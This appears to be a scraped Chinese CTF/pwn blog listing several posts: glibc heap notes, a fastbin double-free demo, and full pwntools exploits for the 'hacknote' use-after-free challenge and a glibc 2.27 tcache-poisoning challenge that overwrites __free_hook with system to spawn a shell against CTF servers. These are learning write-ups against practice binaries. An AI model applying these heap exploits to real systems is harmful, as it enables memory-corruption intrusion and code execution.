<p>购入设备：</p>
<p>编程器</p>
<p>芯片测试夹</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/06/28/ptenum/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/28/ptenum/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-28 21:45:17" itemprop="dateCreated datePublished" datetime="2021-06-28T21:45:17+08:00">2021-06-28</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ptenum"><a href="#ptenum" class="headerlink" title="ptenum"></a>ptenum</h1><p><a target="_blank" rel="noopener" href="https://www.sciencedirect.com/science/article/pii/S1742287619301574?via=ihub">https://www.sciencedirect.com/science/article/pii/S1742287619301574?via%3Dihub</a></p>
<p>我们在一个内存取证框架的插件中实现了我们的方法，这个插件可以自动报告任何包含可执行页面的内存区域，并根据不同的隐藏技术以及现实世界中的恶意软件样本对其进行评估。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/06/27/2-23learn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/27/2-23learn/" class="post-title-link" itemprop="url">2-23learn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-27 19:19:19" itemprop="dateCreated datePublished" datetime="2021-06-27T19:19:19+08:00">2021-06-27</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-07-25 19:04:29" itemprop="dateModified" datetime="2021-07-25T19:04:29+08:00">2021-07-25</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>bins:双向链表</p>
<p>unsorted bin   small bins  large bins</p>
<p>fast bins：比smallbins还小，p标志恒不变</p>
<p>典型例题：hacknote—pwnable</p>
<p>查看glibc版本：strings libc.so.6 |grep ‘GLIBC’</p>
<p><img src="https://i.imgur.com/rVCFIUB.png"></p>
<p><img src="https://i.imgur.com/SwxmHWv.png"></p>
<p><img src="https://i.imgur.com/2bltBpO.png"></p>
<p><img src="https://i.imgur.com/ybcwSpx.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"> </span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"> </span><br><span class="line">debug &#x3D; 1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def wp_add(size, content):</span><br><span class="line">    r.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">    r.send(&#39;1&#39;.ljust(4, &#39;\x00&#39;))</span><br><span class="line"> </span><br><span class="line">    r.recvuntil(&#39;Note size :&#39;)</span><br><span class="line">    r.send(str(size).ljust(8, &#39;\x00&#39;))</span><br><span class="line"> </span><br><span class="line">    r.recvuntil(&#39;Content :&#39;)</span><br><span class="line">    r.send(content)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def wp_delete(index):</span><br><span class="line">    r.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">    r.send(&#39;2&#39;.ljust(4, &#39;\x00&#39;))</span><br><span class="line"> </span><br><span class="line">    r.recvuntil(&#39;Index :&#39;)</span><br><span class="line">    r.send(str(index).ljust(4, &#39;\x00&#39;))</span><br><span class="line">     </span><br><span class="line"> </span><br><span class="line">def wp_print(index):</span><br><span class="line">    r.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">    r.send(&#39;3&#39;.ljust(4, &#39;\x00&#39;))</span><br><span class="line"> </span><br><span class="line">    r.recvuntil(&#39;Index :&#39;)</span><br><span class="line">    r.send(str(index).ljust(4, &#39;\x00&#39;))</span><br><span class="line">    return r.recv(4)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def wp_exit():</span><br><span class="line">    r.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">    r.send(&#39;4&#39;.ljust(4, &#39;\x00&#39;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def exp(debug):</span><br><span class="line"> </span><br><span class="line">    global r</span><br><span class="line">     </span><br><span class="line">    if debug &#x3D;&#x3D; 1:</span><br><span class="line">        r &#x3D; process(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">        #gdb.attach(r, &#39;b *0x0804869A&#39;)</span><br><span class="line">        lib &#x3D; ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.23.so&#39;)</span><br><span class="line">    else:</span><br><span class="line">        r &#x3D; remote(&#39;111.198.29.45&#39;, 41471)</span><br><span class="line">        lib &#x3D; ELF(&#39;.&#x2F;hacknote_lib&#39;)</span><br><span class="line"> </span><br><span class="line">    elf &#x3D; ELF(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">    print elf.got[&#39;puts&#39;]</span><br><span class="line">    wp_add(0x20, &#39;a&#39;)   #index:0</span><br><span class="line">    wp_add(0x20, &#39;a&#39;)   #index:1</span><br><span class="line">    wp_delete(0)</span><br><span class="line">    wp_delete(1)</span><br><span class="line">    wp_add(0x8, p32(0x0804862B) + p32(elf.got[&#39;puts&#39;])) #index:2</span><br><span class="line">    lib_base &#x3D; u32(wp_print(0)) - lib.sym[&#39;puts&#39;]</span><br><span class="line">    log.info(&#39;lib_base &#x3D;&gt; %#x&#39;%lib_base)</span><br><span class="line"> </span><br><span class="line">    wp_delete(2)</span><br><span class="line">    wp_add(0x8, p32(lib_base + lib.sym[&#39;system&#39;]) + &#39;||sh&#39;)</span><br><span class="line">    wp_print(0)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/25/lonelyworlf_wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/25/lonelyworlf_wp/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-05-25 17:50:04 / Modified: 20:06:52" itemprop="dateCreated datePublished" datetime="2021-05-25T17:50:04+08:00">2021-05-25</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>很经典的堆题，功能齐全</p>
<p><img src="picture%5Cfun.png" alt="fun"></p>
<p>index没有用，全程就只有一个指针。delete函数存在uaf</p>
<p><img src="picture%5Cuaf.png" alt="uaf"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先创造一个大小为8的堆块，free之后写8个字节的数据泄露堆地址，更新过后的glibc2.27不能直接double free，需要通过edit函数将chunk_bk位置上的数据清空后完成tcache poisoning在heap_base+0x18分配堆块，并写入数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###          填充  0xf0大小堆块的个数    填充            下一次分配0x30堆块的地址</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">5</span> + <span class="string">&#x27;\x07&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">2</span> + <span class="number">0x38</span>) + p64(heap_base_addr + <span class="number">0x270</span>) + <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>
<p>之后创建大小为0x60和0x70的堆块（加起来等于0xf0，创建完就free）。申请0x20大小的堆块，修改chunk_0x60的size为0xf1。再将chunk_0x60申请回来再free就可以泄露libc地址。之后就可以修改free_hook为system。从而getshell</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh=remote(<span class="string">&#x27;124.71.224.75&#x27;</span>,<span class="string">&#x27;25336&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_exit</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_base_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10</span>//tcache在基地址+<span class="number">0x10</span>处</span><br><span class="line">print(<span class="built_in">hex</span>(heap_base_addr))//先创造一个大小为<span class="number">8</span>的堆块，free之后写<span class="number">8</span>个字节的数据泄露堆地址</span><br><span class="line"></span><br><span class="line">可以通过：</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&#x27;12345678&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">新申请的’<span class="number">12345678</span>‘将覆盖chunk0的fd，printf(<span class="string">&#x27;%s&#x27;</span>)会连带着把后面的指向chunk2的bk也打印出来，完成堆地址的泄露</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">edit(p64(heap_base_addr + <span class="number">0x18</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">5</span> + <span class="string">&#x27;\x07&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">2</span> + <span class="number">0x38</span>) + p64(heap_base_addr + <span class="number">0x270</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(payload)//更新过后的glibc2<span class="number">.27</span>不能直接double free，需要通过edit函数将chunk_bk位置上的数据清空后完成tcache poisoning在heap_base+<span class="number">0x18</span>分配堆块，并写入数据。</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0xf1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc.address = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">print(<span class="built_in">hex</span>(libc.address))//之后创建大小为<span class="number">0x60</span>和<span class="number">0x70</span>的堆块（加起来等于<span class="number">0xf0</span>，创建完就free）。申请<span class="number">0x20</span>大小的堆块，修改chunk_0x60的size为<span class="number">0xf1</span>。再将chunk_0x60申请回来再free就可以泄露libc地址。</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">edit(p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">edit(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="string">&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">sh.interactive()//之后就可以修改free_hook为system。从而getshell</span><br></pre></td></tr></table></figure>
<p><img src="picture%5Cget_flag.png" alt="get_flag"></p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/19/2-27-learn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/19/2-27-learn/" class="post-title-link" itemprop="url">2.27_learn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-05-19 21:02:36" itemprop="dateCreated datePublished" datetime="2021-05-19T21:02:36+08:00">2021-05-19</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-08-23 23:01:50" itemprop="dateModified" datetime="2021-08-23T23:01:50+08:00">2021-08-23</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="–fastbin-dup"><a href="#–fastbin-dup" class="headerlink" title="–fastbin_dup"></a>–fastbin_dup</h1><h2 id="chunk类型"><a href="#chunk类型" class="headerlink" title="chunk类型"></a>chunk类型</h2><p>allocated chunk</p>
<p>free chunk</p>
<p>top chunk</p>
<p>last remainter chunk</p>
<h2 id="bins类型"><a href="#bins类型" class="headerlink" title="bins类型"></a>bins类型</h2><p>tcachebins—2.26以后推出</p>
<p>fastbins</p>
<p>sortbins</p>
<p>smallbins</p>
<h3 id="tcachebins"><a href="#tcachebins" class="headerlink" title="tcachebins"></a>tcachebins</h3><p>tcachebins是一个长度为64的字节数组，每个字节数组对应一条链表。</p>
<p>所以tcachebins只能存放0x0-0x400大小的堆，且每个链表长度为7。</p>
<p>并且类似于fastbins，是一个单链表。</p>
<p><strong>例题文件连续申请堆内存，随后连续释放堆内存。</strong></p>
<p><img src="https://i.imgur.com/r4yIHE4.png"></p>
<h4 id="连续申请的堆空间"><a href="#连续申请的堆空间" class="headerlink" title="连续申请的堆空间"></a>连续申请的堆空间</h4><p><img src="https://i.imgur.com/QtI3MGc.png"></p>
<h5 id="只申请不释放的bins"><a href="#只申请不释放的bins" class="headerlink" title="只申请不释放的bins"></a>只申请不释放的bins</h5><p><img src="https://i.imgur.com/sTGowrk.png"></p>
<h4 id="连续释放堆空间"><a href="#连续释放堆空间" class="headerlink" title="连续释放堆空间"></a>连续释放堆空间</h4><p><img src="https://i.imgur.com/D82AIRU.png"></p>
<blockquote>
<p>仅仅释放了7个chunk，我们申请了8个</p>
</blockquote>
<h5 id="申请完释放的bins"><a href="#申请完释放的bins" class="headerlink" title="申请完释放的bins"></a>申请完释放的bins</h5><img src="https://i.imgur.com/ugvLxih.png"  />





<p>可以看到释放以后，这些chunk成为了tcachebins中的一员，该数组已经满了。</p>
<p><img src="https://i.imgur.com/AIH3Tig.png"></p>
<p>查看任意一块free chunk，可以发现除了头部还有指向前一块freechunk的指针和指向tcachebin_0x20数组的指针。</p>
<p><img src="https://i.imgur.com/qo0qbNH.png"></p>
<p>在释放大小为0x0-0x400大小的堆的时候，首先会被释放入对应长度tcachebins对应的链表中，当长度超出7后，再放入fastbin或unsortbins中。malloc的时候当发现malloc对应大小的堆，先从tcachebins中取出。注意当如果从fastbin中取出了一个块，那么会把剩余的块放入tcache中直至填满tcache（smallbin中也是一样）。如果进入了unsortedbin，且chunk的size和当前申请的大小精确匹配，那么在tcache未满的情况下会将其放入到tcachebin中</p>
<blockquote>
<p>q:指向60而不是50?</p>
</blockquote>
<h2 id="初次分配"><a href="#初次分配" class="headerlink" title="初次分配"></a>初次分配</h2><p>例题文件：fastbin_dup.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>gcc -g fastbin_dup.c -o fastbin_dup</p>
